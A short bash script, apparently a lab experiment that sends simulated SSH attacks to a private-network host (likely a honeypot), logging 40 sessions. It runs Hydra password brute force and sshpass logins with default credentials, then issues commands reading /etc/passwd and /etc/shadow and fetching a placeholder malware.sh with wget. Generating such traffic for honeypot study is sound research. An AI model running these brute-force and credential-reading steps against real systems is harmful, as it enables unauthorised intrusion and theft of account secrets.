#!/bin/bash
IP="192.168.0.13"
PORT="2222"
LOG="/home/elizabeth/experimento_log.txt"

echo "=== INICIO EXPERIMENTO 40 SESIONES ===" > $LOG
echo "Fecha: $(date)" >> $LOG

USERS=("root" "admin" "ubuntu" "pi" "user" "test" "oracle" "postgres")
PASSES=("admin" "123456" "password" "root" "1234" "qwerty" "toor" "test123")
COMMANDS=(
  "whoami; ls; exit"
  "uname -a; cat /etc/passwd; exit"
  "whoami; wget http://example.com/malware.sh; exit"
  "ls /etc; cat /etc/shadow; exit"
  "id; ps aux; exit"
)

echo "--- FASE 1: Hydra ---" >> $LOG
hydra -l root -P /home/elizabeth/passwords.txt ssh://$IP:$PORT -t 4 -vV >> $LOG 2>&1
sleep 10

echo "--- FASE 2: sshpass ---" >> $LOG
for i in $(seq 1 20); do
  U=${USERS[$((RANDOM % 8))]}
  P=${PASSES[$((RANDOM % 8))]}
  C=${COMMANDS[$((RANDOM % 5))]}
  sshpass -p "$P" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p $PORT root@$IP "$C" 2>/dev/null
  sleep 3
done

echo "=== EXPERIMENTO FINALIZADO ===" >> $LOG
